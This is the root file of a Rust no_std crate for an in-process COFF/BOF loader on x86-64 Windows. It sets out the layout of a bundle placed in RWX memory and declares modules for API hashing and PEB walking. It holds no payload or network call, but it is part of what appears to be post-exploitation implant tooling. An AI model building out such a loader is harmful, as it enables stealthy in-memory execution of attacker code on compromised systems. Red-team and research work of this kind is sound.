//! coff_loader — in-process COFF/BOF loader (no_std, x86-64 Windows)
//!
//! Receives a BOF bundle in RWX memory (lpParameter = bundle_base):
//!
//!   [0..4]   "BCOF" magic
//!   [4..8]   entry_offset: u32  — offset from bundle[0] to this loader stub
//!   [8..12]  coff_offset: u32   — offset from bundle[0] to COFF .o bytes
//!   [12..16] coff_size: u32
//!   [16..20] args_offset: u32   — offset from bundle[0] to packed args
//!   [20..24] args_size: u32
//!   [24..32] output_ptr: u64    — written by loader after go() returns
//!   [32..36] output_size: u32   — written by loader after go() returns
//!   [36..40] reserved: u32
//!   [40..]   this loader stub (entry_offset = 40)
//!   [coff_offset..] COFF .o bytes
//!   [args_offset..] BeaconData-packed arguments

#![no_std]
#![no_main]
#![allow(non_snake_case, non_camel_case_types, clippy::missing_safety_doc)]

pub mod api_hash;
pub mod entry;
pub mod loader;
pub mod peb_walk;

#[cfg(not(test))]
#[panic_handler]
fn panic(_: &core::panic::PanicInfo) -> ! {
    loop {
        unsafe { core::arch::asm!("pause", options(nostack, nomem)); }
    }
}
